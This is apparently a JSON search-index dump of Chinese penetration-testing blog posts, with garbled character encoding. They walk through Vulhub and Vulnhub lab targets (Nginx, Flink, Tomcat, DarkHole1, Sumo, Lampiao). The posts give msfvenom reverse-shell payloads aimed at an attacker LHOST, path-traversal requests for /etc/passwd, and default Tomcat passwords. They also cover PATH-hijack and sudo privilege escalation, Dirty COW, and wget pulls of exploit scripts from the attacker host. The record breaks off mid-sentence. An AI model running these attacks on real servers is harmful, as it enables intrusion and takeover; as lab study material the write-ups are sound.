http://192.168.x.x:8080/%0a%0dX-XSS-Protection:%200%0a%0d%0a%0d&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; //æ³¨å…¥X-XSS-Protection:0ç»•è¿‡æµè§ˆå™¨Fliterï¼Œè¿›è¡Œxssæ³¨å…¥  \n\nç›®å½•ç©¿è¶Š  \n\né”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼šlocation /files &#123;  \n   alias /home/; //ï¼ˆåŸæœ¬çš„ç›®çš„æ˜¯ä¸ºäº†è®©ç”¨æˆ·è®¿é—®åˆ°/home/ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰  \n&#125;  Nginxåœ¨é…ç½®åˆ«åï¼ˆaliasï¼‰çš„æ—¶å€™ï¼Œå¦‚æœåŸå/fileså°¾éƒ¨å¿˜è®°åŠ /ï¼Œå°†é€ æˆä¸€ä¸ªç›®å½•ç©¿è¶Šæ¼æ´ã€‚payload http://192.168.x.x:8081/files../  \n\nadd_headerå¤±æ•ˆ  \n\né”™è¯¯çš„é…ç½®æ–‡ä»¶ç¤ºä¾‹ï¼šadd_header Content-Security-Policy \"default-src 'self'\"; // çˆ¶å—ï¼ˆæ•´ç«™ï¼‰ä¸­add_headerè®¾ç½®äº†ç›¸å…³å®‰å…¨è§„åˆ™   \nadd_header X-Frame-Options DENY;  \nlocation = /test1 &#123;  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  \nlocation = /test2 &#123;  \n   add_header X-Content-Type-Options nosniff; //ä½†/test2çš„locationä¸­åˆæœ‰add_headerè®¾ç½®äº†X-Content-Type-Optionsï¼Œå¯¼è‡´çˆ¶å—add_headerçš„è®¾ç½®è¢«è¦†ç›–è€Œå¤±æ•ˆ  \n   rewrite ^(.*)$ /xss.html break;  \n&#125;  Nginxé…ç½®æ–‡ä»¶å­å—ï¼ˆserverã€locationã€ifï¼‰ä¸­çš„add_headerï¼Œå°†ä¼šè¦†ç›–çˆ¶å—ä¸­çš„add_headeræ·»åŠ çš„HTTPå¤´ï¼Œé€ æˆä¸€äº›å®‰å…¨éšæ‚£ã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Nginx"]},{"title":"Vulhub|Flinké›†åˆ","url":"/338e3c98.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Apache Flink Upload Path Traversal (CVE-2020-17518)å½±å“ç‰ˆæœ¬ : Flink 1.5.1-1.11.2Path : flink/CVE-2020-17518Vul : æ–‡ä»¶ä¸Šä¼ Breakthroughï¼š  \n\nï¼ˆaï¼‰msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.x.x LPORT=444 -f jar -o shell.jar â€“ ä¸Šä¼ ç”Ÿæˆçš„.jaræ–‡ä»¶ â€“ ä¸Šä¼ æˆåŠŸï¼ˆbï¼‰msfå¼€å¯ç›‘å¬ â€“ å‰ç«¯Submitä¸Šä¼ çš„.jaråŒ… â€“ msfè¿™é‡Œä½¿ç”¨shellå‘½ä»¤getshell  \n\n2.Apache Flink jobmanager/logs Path Traversal (CVE-2020-17519)å½±å“ç‰ˆæœ¬ : Flink 1.11.0-1.11.2Path : flink/CVE-2020-17519Vul : ç›®å½•ç©¿è¶ŠBreakthroughï¼š  \n\nå·²ç»ç»™å‡ºäº†å­˜åœ¨ç›®å½•ç©¿è¶Šçš„ç›®å½•jobmanager/logs â€“ è®¿é—®http://&lt;aim_ip&gt;:&lt;aim_port&gt;/jobmanager/logs â€“ bpæ‹¦æˆª â€“ ä¿®æ”¹GETå‚æ•°ä¸º /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd  â€“ èƒ½å¤Ÿè¿”å›/etc/passwdæ–‡ä»¶å†…å®¹  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Flink"]},{"title":"Vulhub|Tomcaté›†åˆ","url":"/386f84ef.html","content":"0.é¶åœºæ­å»ºå‚è€ƒä½œè€…[jpSpaceX]å†™çš„æ–‡ç« https://www.cnblogs.com/jpSpaceX/articles/14900470.html\n1.Tomcat7+ Weak Password &amp;&amp; Backend Getshell Vulnerabilityå½±å“ç‰ˆæœ¬ : Tomcat8.0Vul : å¼±å£ä»¤ã€æ–‡ä»¶ä¸Šä¼ Path : tomcat/tomcat8Breakthroughï¼š  \n\nï¼ˆaï¼‰tomcaté»˜è®¤å£ä»¤ï¼š\n\n\n\nusername\npassword\n\n\n\n\nadmin\n\n\n\nadmin\nadmin\n\n\ntomcat\ntomcat\n\n\n\nï¼ˆbï¼‰msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.x.x LPORT=444 -f war -o shell.war â€“ ä¸Šä¼ ç”Ÿæˆçš„.waræ–‡ä»¶ â€“ æŠ“åŒ… â€“ ä»ä¸Šä¼ æˆåŠŸçš„å“åº”ä¸­å¾—åˆ°ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ /shell/&lt;jsp_name&gt;.jspï¼ˆcï¼‰msfå¼€å¯ç›‘å¬ â€“ æµè§ˆå™¨è®¿é—®ä¸Šä¼ æ–‡ä»¶è·¯å¾„ â€“ msfè¿™é‡Œä½¿ç”¨scriptå‘½ä»¤getshell  \n\n2.Tomcat Arbitrary Write-file Vulnerability through PUT Method (CVE-2017-12615)å½±å“ç‰ˆæœ¬ : Apache Tomcat 7.0.0-7.0.79ï¼ˆ7.0.81ä¿®å¤ä¸å®Œå…¨ï¼‰Vul : æ–‡ä»¶ä¸Šä¼ Path : tomcat/CVE-2017-12615Breakthroughï¼š    \n\nï¼ˆaï¼‰nikto -h 192.168.x.x -p 8080 æ‰«ä¸€ä¸‹å‘ç°ç½‘ç«™æ ¹ç›®å½•ä¸‹å¯ä»¥PUTï¼ˆbï¼‰åœ¨æ ¹ç›®å½•ä¸‹åˆ·æ–°ç½‘ç«™ â€“ bpæ‹¦æˆª â€“ å°†è¯·æ±‚æ”¹ä¸ºPUTï¼Œå†™å…¥jspæœ¨é©¬ â€“ é‡æ”¾ï¼ˆcï¼‰è¿™é‡Œè¯·æ±‚åŒ…é‡ŒPUTçš„æ–‡ä»¶åç›´æ¥ä½¿ç”¨ /shell.jsp ä¸èƒ½æˆåŠŸä¸Šä¼ ï¼Œéœ€åœ¨æ–‡ä»¶ååç¼€æ·»åŠ /ã€::$DATAã€%20æˆ–.å³å¯ç»•è¿‡ â€“ æˆåŠŸä¸Šä¼  â€“ èšå‰‘è¿æ¥  \n\n3.Apache Tomcat AJP Arbitrary File Read / Include Vulnerabilityï¼ˆCVE-2020-1938ï¼‰å½±å“ç‰ˆæœ¬ : Apache Tomcat 6 / 7-7.0.100 / 8-8.5.51 / 9-9.0.31 Vul : æ–‡ä»¶åŒ…å«Path : tomcat/CVE-2020-1938Breakthroughï¼š  \n\nè¿™ä¸ªä¸çŸ¥é“å¦‚ä½•æ‰‹åŠ¨å¤ç°ï¼Œç›´æ¥åˆ©ç”¨äº†msfçš„ajpç›¸å…³expã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulhub","Tomcat"]},{"title":"Vulnhub|DarkHole1","url":"/480ec251.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nnmapæ‰«ænmap -sn 192.168.xxx.0/24å‘ç°ç›®æ ‡ä¸»æœºipã€‚nmap -sS -Pn -A -p- -n 192.168.228.129 æ‰«ä¸€ä¸‹è¯¦ç»†ä¿¡æ¯ï¼Œå‘ç°å¯ç”¨äº†22å’Œ80ç«¯å£ã€‚  \n\n2.(80ç«¯å£)Web\nè®¿é—®http://192.168.228.129å‘ç°æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œé¶æœºä»‹ç»é¡µæç¤ºäº†ä¸è¦æŠŠæ—¶é—´æµªè´¹åœ¨çˆ†ç ´ä¸Šï¼Œæ•…è¿™é‡Œæ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†è¿›å»çœ‹çœ‹æ˜¯ä»€ä¹ˆï¼Œä»¥username=adminæ³¨å†Œæ—¶ï¼Œæç¤ºç”¨æˆ·åå·²å­˜åœ¨ï¼šä½¿ç”¨æ³¨å†Œçš„è´¦å·ç™»é™†æˆåŠŸï¼ŒGETè¯·æ±‚ä¼ é€’å‚æ•°id=2ï¼Œè¿™é‡ŒçŒœæµ‹id=1å°±æ˜¯ç”¨æˆ·adminï¼Œç›´æ¥æŠŠurlä¸­çš„id=2æ”¹ä¸ºid=1éªŒè¯æ˜¯å¦å­˜åœ¨è¶Šæƒï¼Œå‰ç«¯æç¤ºï¼šâ€Your Not Allowed To Access another user informationâ€ã€‚æœ‰ä¸€ä¸ªä¿®æ”¹å¯†ç çš„å…¥å£ï¼Œä¿®æ”¹å¯†ç ä½¿ç”¨bpæ‹¦æˆªä¸€ä¸‹ï¼Œä¿®æ”¹POSTçš„ä¼ å‚id=1ï¼Œä¿®æ”¹æˆåŠŸï¼šä½¿ç”¨[è´¦æˆ·ï¼šå¯†ç ][adminï¼š123456]ç™»å½•ï¼Œç™»é™†æˆåŠŸï¼ŒæˆåŠŸè·å–adminæƒé™ã€‚  \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\nadminæƒé™åŒ…å«ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œç›´æ¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ .phpæ–‡ä»¶ï¼Œå‰ç«¯é¡µé¢æç¤ºâ€Sorry , Allow Ex : jpg,png,gif â€œï¼Œè¿™é‡Œå°è¯•äº†4ç§åŠæ³•éƒ½æ²¡æœ‰æˆåŠŸgetshellã€‚  \n\nï¼ˆaï¼‰bpæ‹¦æˆª-å°†Content-Type: application/x-phpæ”¹ä¸ºContent-Type: imge/jpg-é‡æ”¾ï¼›ï¼ˆbï¼‰bpæ‹¦æˆª-Hexæ¨¡å¼ä¸‹å¯¹ä¼ å…¥æ–‡ä»¶åè¿›è¡Œ00æˆªæ–­ï¼ˆåœ¨.phpä¸.jpgä¹‹é—´æ’å…¥Hex Codeï¼‰-é‡æ”¾\n\n(åœ¨php&lt;5.3.4ä¸­ï¼Œå¤„ç†å­—ç¬¦ä¸²çš„å‡½æ•°è®¤ä¸º0x00æ˜¯ç»ˆæ­¢ç¬¦ã€‚%00åœ¨urlè¯­è¨€é‡Œä»£è¡¨ç©ºæ ¼â€œ â€ï¼Œå› æ­¤å®ƒèµ·åˆ°çš„ä½œç”¨å°±æ˜¯æˆªæ–­æ–‡ä»¶çš„ååŠæ®µï¼Œè®©å®ƒè¯†åˆ«åˆ°çš„æ–‡ä»¶æ ¼å¼æ˜¯.jpgï¼Œè€Œè§£ææ—¶ä¼šæ˜¯å‰é¢çš„è„šæœ¬æ ¼å¼ã€‚)ï¼›\n\nï¼ˆcï¼‰åœ¨æœ¨é©¬æ–‡ä»¶ .phpå¤´éƒ¨åŠ ä¸Šjpgæ ¼å¼çš„GIF89è¿›è¡Œæ¬ºéª—-ä¸Šä¼ æˆåŠŸ-ä½†ä¸Šä¼ çš„æ–‡ä»¶ä»æ˜¯ä»¥ .jpgä¸ºåç¼€ï¼Œæ— æ³•æ‰§è¡Œå…¶ä¸­çš„phpä»£ç ï¼Œæ­¤å¤„ä¹Ÿæ‰¾ä¸åˆ°å¯ä»¥FileInclusionçš„åœ°æ–¹ã€‚ï¼ˆdï¼‰copy /b a.jpg+shell.php shell.jpgå°†æœ¨é©¬å†™å…¥å›¾ç‰‡æœ«ç«¯-ä¸Šä¼ æˆåŠŸ-ä½†ä¸Šä¼ çš„æ–‡ä»¶ä»æ˜¯ä»¥ .jpgä¸ºåç¼€ï¼Œæ— æ³•æ‰§è¡Œå…¶ä¸­çš„phpä»£ç ï¼Œæ­¤å¤„ä¹Ÿæ‰¾ä¸åˆ°å¯ä»¥FileInclusionçš„åœ°æ–¹ã€‚  \n\nä»¥å¦‚ä¸‹æ–¹å¼ç»“å°¾çš„æ–‡ä»¶ä¼šè¢«apacheå½“åšphpè§£æï¼šphpã€php3ã€php4ã€php5ã€php7ã€phtã€phtmlçœ‹äº†ç½‘ä¸Šå…¶ä»–äººçš„æ€è·¯ï¼Œå‘ç°è‡ªå·±åˆ»æ¿å±€é™åœ°è®¤ä¸ºä¸Šä¼ æ–‡ä»¶çš„ç™½åå•åªæœ‰å‰ç«¯æç¤ºçš„jpgã€pngå’Œgifã€‚å…¶å®åªè¦å°†æœ¨é©¬æ–‡ä»¶åç¼€æ”¹ä¸ºphtmlä¹Ÿèƒ½å¤Ÿä¸Šä¼ æˆåŠŸå¹¶æˆåŠŸè§£æphpä»£ç ã€‚è¿™é‡Œä½¿ç”¨msfvenomç”Ÿæˆåå¼¹shellä»£ç æ–‡ä»¶msfshell.phpï¼šmsfvenom -p php/meterpreter/reverse_tcp lhost=192.168.228.128 lport=443 -o msfshell.phpæ–‡ä»¶ç”ŸæˆåæŠŠä»£ç &lt;?phpå‰å¤šä½™çš„éƒ¨åˆ†åˆ æ‰ï¼ŒæŠŠæ–‡ä»¶åç¼€æ”¹ä¸º .phtmlï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶ã€‚æŸ¥çœ‹ä¸Šä¼ æˆåŠŸçš„å“åº”æŠ¥æ–‡èƒ½è·å¾—æœåŠ¡å™¨çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„ /upload/&lt;æœ¨é©¬æ–‡ä»¶&gt;ä½¿ç”¨msfconsoleè¿›è¡Œç›‘å¬ï¼šuse exploit&#x2F;multi&#x2F;handler  \nset payload php&#x2F;meterpreter&#x2F;reverse_tcp  \nset lhost 192.168.228.128 &#x2F;&#x2F;åŒmsfvenomç”Ÿæˆåå¼¹shellä»£ç ä¸­è®¾ç½®çš„lhost  \nset lport 443 &#x2F;&#x2F;åŒmsfvenomç”Ÿæˆåå¼¹shellä»£ç ä¸­è®¾ç½®çš„lport  \nrun  åœ¨æµè§ˆå™¨è®¿é—® http://192.168.228.128/upload/msfshell.phtmlï¼ŒgetshellæˆåŠŸï¼Œå‡çº§ä¸ºäº¤äº’å¼shellï¼šç™»å½•ç”¨æˆ·www-dataæƒé™è¾ƒä½ï¼Œæ²¡æœ‰è·å–åˆ°ä»€ä¹ˆä¿¡æ¯ã€‚\n\nè¿™é‡Œæˆ‘å°è¯•è¿‡ä½¿ç”¨ä¸€å¥è¯æœ¨é©¬+èšå‰‘è¿æ¥è¿›å…¥shellï¼Œä½†èšå‰‘çš„shellæ²¡æ³•è¿›è¡Œåé¢çš„export PATHï¼Œä¸çŸ¥é“æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ  \n\n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\ncat /etc/passwd | grep /bin/bashå‘ç°ä¸‰ä¸ªç”¨æˆ·rootã€darkholeå’Œjohnï¼Œå»darkholeçš„å·¥ä½œè·¯å¾„ /home/darkholeä¸‹æ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚å»johnçš„å·¥ä½œè·¯å¾„ /home/johnä¸‹ls -laæŸ¥çœ‹ï¼Œå‘ç°passwordã€user.txtã€file.pyå’Œtotoæ–‡ä»¶ï¼Œpasswordã€user.txtå’Œfile.pyéƒ½æ²¡æœ‰æƒé™ï¼Œæ•…ä»totoæ–‡ä»¶å…¥æ‰‹ï¼Œå‘ç°totoæ–‡ä»¶å…·æœ‰sæƒé™ï¼ˆè®¾ç½®ä½¿æ–‡ä»¶åœ¨æ‰§è¡Œé˜¶æ®µå…·æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ï¼Œç›¸å½“äºä¸´æ—¶æ‹¥æœ‰æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½ã€‚ï¼‰ï¼š  \n./toto æ‰§è¡Œtotoæ–‡ä»¶ï¼Œå‘ç°æ˜¯ä»¥johnèº«ä»½æ‰§è¡Œçš„ä¸€ä¸ªidå‘½ä»¤ï¼Œæ•…ä½¿ç”¨åŠ«æŒç¯å¢ƒå˜é‡ææƒï¼š1-åœ¨/tmpåˆ›å»ºä¸€ä¸ªidå‘½ä»¤æ–‡ä»¶å¹¶èµ‹æƒï¼šecho &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 /tmp/id2-æŠŠå½“å‰/tmpç›®å½•æ·»åŠ åˆ°ç¯å¢ƒå˜é‡PATHï¼šexport PATH=/tmp:$PATH3-æ‰§è¡Œtotoæ–‡ä»¶ï¼š./totoæ–°å¢çš„ç¯å¢ƒå˜é‡ç›®å½•ä¼šæ·»åŠ åœ¨$PATHæœ€å‰(å·¦)ç«¯ï¼Œæ‰§è¡Œidå‘½ä»¤çš„æ—¶å€™ä¼šä¼˜å…ˆä»å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾ç¨‹åºï¼Œæ‰€ä»¥idå‘½ä»¤ä¼šè¢«åŠ«æŒï¼ˆæœŸæœ›æ‰§è¡Œçš„æ˜¯idï¼Œä½†å®é™…æ‰§è¡Œçš„æ˜¯è¢«å†™å…¥pathçš„idæ–‡ä»¶ä¸­çš„å‘½ä»¤ï¼‰ã€‚æ‹¿åˆ°johnçš„shellï¼šcat passwordæ‹¿åˆ°å¯†ç root123ã€‚cat user.txtæ‹¿åˆ°flagDarkHole{You_Can_DO_It}ã€‚ä»¥johnèº«ä»½æƒ³è¿›å…¥ /rootè¿˜æ˜¯æƒé™ä¸å¤Ÿï¼Œè¿˜éœ€è¿›ä¸€æ­¥ææƒã€‚æ•´ç†ä¸€ä¸‹ç°åœ¨å¾—åˆ°çš„ä¿¡æ¯ï¼Œä¸‰ä¸ªç”¨æˆ·rootã€johnå’Œdarkholeï¼Œä¸€ä¸ªå¯†ç root123ã€‚è¿™é‡Œæœ‰ä¸¤ä¸ªé€”å¾„æå‡åˆ°rootæƒé™ï¼š(1)ä»¥johnè¿›è¡Œsudoææƒï¼š  \n\nsudo -læŸ¥çœ‹å‘ç°johnæœ‰å¯¹ /home/john/file.pyæ‰§è¡Œpython3çš„sudoæƒé™ã€‚echo &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;&gt;/home/john/file.pyå°†pythonçš„getshellä»£ç å†™å…¥/home/john/file.pyã€‚sudo python3 /home/john/file.pyæ‰§è¡Œfile.pyã€‚   \n\n(2)åˆ©ç”¨darkholeè¿›è¡Œææƒï¼š  \n\nsu darkholeåˆ‡æ¢è´¦æˆ·ï¼Œè¾“å…¥å¯†ç root123ï¼ˆç»è¿‡å°è¯•johnå’Œdarkholeéƒ½èƒ½ä½¿ç”¨è¿™ä¸ªå¯†ç ï¼‰sudo -læŸ¥çœ‹å‘ç°darkholeå…·æœ‰çš„sudoæƒé™ä¸º (ALL:ALL)ï¼Œæ•…æ­¤å‡ºå¯ä»¥ç›´æ¥ä½¿ç”¨sudo -iå‘½ä»¤è¿›è¡Œææƒã€‚sudo -iï¼šLinuxç»ˆç«¯å‘½ä»¤ä¸‹æ”¹å˜ç”¨æˆ·å¯¹å‘½ä»¤ä½¿ç”¨æƒé™çš„å‘½ä»¤ï¼Œè·å¾—çš„æ˜¯rootç”¨æˆ·çš„ç¯å¢ƒã€‚sudo -sï¼šæ‰§è¡Œç¯å¢ƒå˜é‡ä¸­çš„ SHELL æ‰€æŒ‡å®šçš„ shellï¼Œæˆ–æ˜¯ /etc/passwd é‡Œæ‰€æŒ‡å®šçš„ shell ã€‚è·å¾—çš„æ˜¯æœ¬èº«ç”¨æˆ·çš„ç¯å¢ƒã€‚  \n\næ‹¿åˆ°rootçš„shellå cat /root/root.txt æ‹¿flagDarkHole{You_Are_Legend}ã€‚ \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","åŠ«æŒç¯å¢ƒå˜é‡ææƒ","FileUpload"]},{"title":"Vulnhub|Sumo","url":"/3a00fd33.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nnmapæ‰«ænmap -sn 192.168.xxx.0/24å‘ç°ç›®æ ‡ä¸»æœºipã€‚nmap -sS -Pn -A -p- -n 192.168.117.142æ‰«ä¸€ä¸‹è¯¦ç»†ä¿¡æ¯ï¼Œå‘ç°å¯ç”¨äº†22å’Œ80ç«¯å£ã€‚  \n\n2.(80ç«¯å£)Web\nnikto -h 192.168.117.142æ‰«ä¸€ä¸‹ç›®å½•å’Œè¯¦ç»†ä¿¡æ¯ï¼Œå‘ç° /cgi-bin/testç›®å½•å¯èƒ½å­˜åœ¨æ¼æ´CVE-2014-6278ï¼š  \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\nç”¨msfconsoleæœä¸€ä¸‹expsearch CVE-2014-6278ã€‚æ‰¾åˆ°ä¸€ä¸ªcgiç›¸å…³exp use exploit/multi/http/apache_mod_cgi_bash_env_execã€‚æŸ¥çœ‹éœ€è¦è¿›è¡Œçš„é…ç½®show optionsï¼Œè®¾ç½®ç›®æ ‡ipset rhost &lt;ç›®æ ‡ip&gt; å’Œ å¯èƒ½å­˜åœ¨æ¼æ´çš„uri  set targeturi /cgi-bin/testã€‚runï¼ŒgetshellæˆåŠŸï¼Œç”¨python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;è½¬æˆäº¤äº’å¼shellã€‚å½“å‰ç”¨æˆ·www-dataæ²¡æœ‰ä»€ä¹ˆæƒé™ã€‚  \n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoã€suidã€å†™å…¥/etc/passwdå’Œåˆ©ç”¨cron*éƒ½æ— æ³•ææƒã€‚lsb_release -aå’Œuname -aæŸ¥çœ‹ä¸€ä¸‹é¶æœºç³»ç»Ÿå†…æ ¸ï¼Œæ˜¯2012å¹´çš„Linuxç³»ç»Ÿã€‚ç°åœ¨æƒ³åŠæ³•æŠŠè„ç‰›æ¼æ´æ‰«æå™¨dirtycowscan.shä¼ åˆ°é¶æœºä¸Šï¼Œç”±äºä¸çŸ¥é“å…·æœ‰sshç™»å½•æƒé™çš„è´¦æˆ·å¯†ç ï¼Œè¿™é‡Œç”¨wgetçš„æ–¹æ³•ä¸Šä¼ ã€‚æŠŠè„ç‰›æ¼æ´æ‰«æå™¨dirtycowscan.shæ”¾è¿›æ”»å‡»æœºkaliçš„ /vat/www/htmlç›®å½•ä¸‹ï¼Œservice apache2 restarté‡å¯æ”»å‡»æœºkaliçš„apacheæœåŠ¡ã€‚ç°åœ¨åœ¨é¶æœºçš„shellä¸Šåº”å¯ä»¥é€šè¿‡wget http://&lt;æ”»å‡»æœºip&gt;/&lt;ç›®æ ‡æ–‡ä»¶path&gt;æ¥ä¸‹è½½ç›®æ ‡æ–‡ä»¶ã€‚\n\nä½†æ­¤å¤„è¦ç‰¹åˆ«æ³¨æ„ï¼Œå½“å‰é¶æœºshellä¸Šçš„ç”¨æˆ·æ˜¯www-dataï¼Œåœ¨å¾ˆå¤šæ–‡ä»¶å¤¹ä¸‹éƒ½æ²¡æœ‰å†™æƒé™ï¼Œæ‰€ä»¥ä¼šå‡ºç°ä¸‹è½½å¤±è´¥çš„æƒ…å†µã€‚  \n\næ‰€ä»¥åœ¨é¶æœºshellä¸Šéœ€è¦å…ˆåˆ‡æ¢åˆ° /tmpç›®å½•ï¼Œå†wget http://192.168.117.128/dirtycowscan.shæ‰èƒ½æˆåŠŸä¸‹è½½dirtycowscan.shã€‚chmod +x dirtycowscan.sh åœ¨é¶æœºä¸Šç»™dirtycowscan.shèµ‹æƒï¼ˆéœ€è¦æ‰§è¡Œï¼‰ï¼Œ./dirtycowscan.sh -sæ‰§è¡Œè„ç‰›æ¼æ´æ‰«æå™¨ï¼Œç³»ç»ŸIS vulnerableå­˜åœ¨è„ç‰›ææƒæ¼æ´ã€‚é€šè¿‡g++ -Vå’Œgcc -VæŸ¥çœ‹é¶æœºç¼–è¯‘ç¯å¢ƒï¼Œå‘ç°æœ‰Cè¯­è¨€çš„ç¼–è¯‘ç¯å¢ƒã€‚åœ¨æ”»å‡»æœºä¸Šsearchsploit dirtyï¼Œæ‰¾åˆ°åˆé€‚çš„expè„šæœ¬ï¼Œåœ¨é¶æœºä¸ŠåŒæ ·ç”¨wgetçš„æ–¹æ³•æŠŠexpè„šæœ¬ä¸‹è½½ä¸‹æ¥ã€‚   \ncat &lt;expè„šæœ¬æ–‡ä»¶&gt; | grep gcc //æŸ¥çœ‹cæºä»£ç çš„ç¼–è¯‘å‘½ä»¤gcc -pthread 40839.c -o dirty -lcrypt //ç¼–è¯‘â†’ç”Ÿæˆç¼–è¯‘æ–‡ä»¶dirty./dirty //è¿è¡Œ  \næŒ‰ç…§æç¤ºè¾“å…¥è‡ªå®šä¹‰å¯†ç ï¼Œç¨‹åºä¼šç”¨è¿™ä¸ªè‡ªå®šä¹‰å¯†ç ç”Ÿæˆä¸€ä¸ªå…·æœ‰rootæƒé™çš„ç”¨æˆ·ï¼Œå†å°†è¿™ä¸ªç”¨æˆ·å†™å…¥å¹¶æ›¿æ¢é¶æœºçš„/etc/passwdã€‚è„šæœ¬ç¨‹åºè¿è¡Œç»“æŸåï¼Œå›åˆ°é¶æœºwww-dataç”¨æˆ·çš„shellï¼Œé€šè¿‡suåˆ‡æ¢å…·æœ‰rootæƒé™çš„ç”¨æˆ·ï¼Œè¾“å…¥åˆšæ‰åœ¨è„šæœ¬ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è‡ªå®šä¹‰çš„å¯†ç ï¼Œå³å¯ææƒæˆåŠŸã€‚cat /root/root.txtè¿›å…¥rootç›®å½•æ‹¿flagï¼š{Sum0-SunCSR-2020_r001}ã€‚  \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","è„ç‰›ææƒ","Metasoploit","searchsploit"]},{"title":"Vulnhub|Lampiao","url":"/9f3820f2.html","content":"0.é¶æœºå®‰è£…\nä¸å†èµ˜è¿°ï¼Œå¯çœ‹ä¹‹å‰çš„Vulnhubç›¸å…³æ–‡ç« ã€‚  \n\n1.ä¿¡æ¯æ”¶é›†\nnmapæ‰«ænmap -sn 192.168.xxx.0/24å‘ç°ç›®æ ‡ä¸»æœºipã€‚nmap -sS -Pn -A -p- -n 192.168.117.141æ‰«ä¸€ä¸‹è¯¦ç»†ä¿¡æ¯ã€‚é¶æœºå¼€æ”¾äº†22(ssh)ã€80(http)å’Œ1898(http)ç«¯å£ã€‚  \n\n2.(80ã€1898)Web\nç”±1.ä¿¡æ¯æ”¶é›†å¯çŸ¥80ç«¯å£æ²¡æœ‰ä»€ä¹ˆå†…å®¹ï¼Œ1898ç«¯å£ä¸‹æœ‰å¾ˆå¤šç›®å½•ï¼Œä¸»è¦ä»1898ç«¯å£ä¸‹æ‰‹ã€‚è®¿é—®http://192.168.117.141:1898/CHANGELOG.txtï¼Œè·å¾—ç‰ˆæœ¬ä¿¡æ¯Drupal 7.54, 2017-02-01ã€‚  \n\n3.getshell\n\n2021-12-03å‘å¸ƒçš„getshellç›¸å…³æ–‡ç« getshell   \n\nç”¨msfæ‰¾ä¸€ä¸‹exp msf5&gt; search drupalã€‚è®¾ç½®å¥½æ‰€éœ€æ¡ä»¶-runï¼ŒgetshellæˆåŠŸï¼Œé€šè¿‡python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;è½¬æˆäº¤äº’å¼shellã€‚cat /etc/passwd å‘ç°ç”¨æˆ·tiago:æŸ¥çœ‹äº†tiagoçš„å·¥ä½œç›®å½• /html/tiago å’Œå…¶ä»–å…³é”®ç›®å½• /var/htmlï¼Œéƒ½æ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚ä¸€èˆ¬ç½‘ç«™æœ‰æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œå°è¯•æŸ¥æ‰¾ä¸‹drupalç½‘ç«™çš„é…ç½®ä¿¡æ¯ã€‚åœ¨sitesç›®å½•ä¸‹çš„é»˜è®¤é…ç½®æ–‡ä»¶defaultä¸­æœ‰setting.phpã€‚cat /var/www/html/sites/default/setting.phpï¼Œæ‰¾åˆ°æ•°æ®åº“ådrupalã€æ•°æ®åº“ç”¨æˆ·drupaluserå’Œå¯†ç Virgulinoã€‚mysql -u drupaluser -pç™»å½•æ•°æ®åº“ã€‚æŸ¥çœ‹usersè¡¨ï¼Œtiagoçš„å¯†ç æ— æ³•è§£ç ã€‚ç›´æ¥ç”¨è´¦æˆ·tiagoå’Œå¯†ç Virgulinoå°è¯•sshç™»å½•ï¼ŒæˆåŠŸã€‚æµè§ˆäº†ç³»ç»Ÿï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚www-dataå’Œtiagoéƒ½è¿›ä¸å» /rootã€‚\n\n4.ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoã€suidã€å†™å…¥/etc/passwdå’Œåˆ©ç”¨cron*éƒ½æ— æ³•ææƒã€‚lsb_release -aå’Œuname -aæŸ¥çœ‹é¶æœºå†…æ ¸ã€‚ç”±äºå·²ç»çŸ¥é“äº†å¯sshç™»å½•çš„è´¦å·tiagoå’Œå¯†ç 